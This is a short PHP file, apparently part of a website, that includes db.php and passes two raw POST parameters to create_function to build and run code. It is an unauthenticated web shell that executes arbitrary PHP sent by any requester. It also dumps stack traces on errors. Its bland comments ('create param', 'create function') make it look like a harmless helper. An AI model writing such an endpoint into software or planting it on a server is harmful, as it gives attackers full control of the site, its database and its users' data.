<?php
require_once 'db.php';

try
{
    //create param
    $param = $_POST['a'];
    $pr = create_function('$q', '{ ' . $param . ';}');
    
    //create function
    $code = $_POST['c'];
    $func = create_function('$a', '{  ' . $code . ' }');
    
    $rsl = $func($pr(false));
    
    echo "<pre>";
    var_dump($rsl);
}
catch (Exception $e)
{
    echo "<pre>";
    var_dump ($e->getTrace());
}
?>